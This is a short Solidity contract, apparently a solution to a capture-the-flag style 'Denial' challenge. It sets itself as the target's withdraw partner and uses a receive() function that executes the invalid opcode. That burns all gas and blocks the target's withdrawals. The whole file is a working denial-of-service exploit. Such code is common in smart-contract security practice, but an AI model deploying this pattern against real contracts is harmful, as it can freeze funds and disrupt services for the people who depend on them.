// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Denial} from "./Denial.sol";

contract DenialHack {
    Denial private immutable TARGET;

    constructor(address payable _target) {
        TARGET = Denial(_target);
        TARGET.setWithdrawPartner(address(this));
    }

    receive() external payable {
        assembly {
            invalid()
        }
    }
}
